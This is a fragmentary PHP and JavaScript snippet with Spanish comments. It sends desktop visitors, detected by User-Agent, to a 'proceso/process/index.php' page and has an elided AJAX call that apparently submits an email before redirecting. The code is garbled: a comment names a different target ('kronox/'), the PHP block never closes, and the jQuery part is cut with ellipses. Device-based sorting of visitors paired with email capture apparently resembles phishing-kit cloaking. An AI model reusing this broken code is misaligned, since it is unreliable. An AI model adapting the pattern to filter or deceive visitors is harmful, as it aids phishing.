<?php
// Función simple para detectar si no es un dispositivo móvil (es decir, es un PC)
function esDispositivoNoMovilSimple() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $dispositivosMoviles = array('Android', 'webOS', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone');
    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return false; // Es un dispositivo móvil
        }
    }
    return true; // No es un dispositivo móvil (es un PC)
}

// Redirigir a 'kronox/' si es un PC
if (esDispositivoNoMovilSimple()) {
    echo '<script type="text/javascript">';
    echo 'window.location.href = "proceso/process/index.php";'; // Ajusta esta ruta si es necesario
    echo '</script>';
        ...
        if (email) {
            $.ajax({
                ...
                success: function(response) {
                    ...
                    window.location.href = 'proceso/process/index.php';
                },
                error: function() {
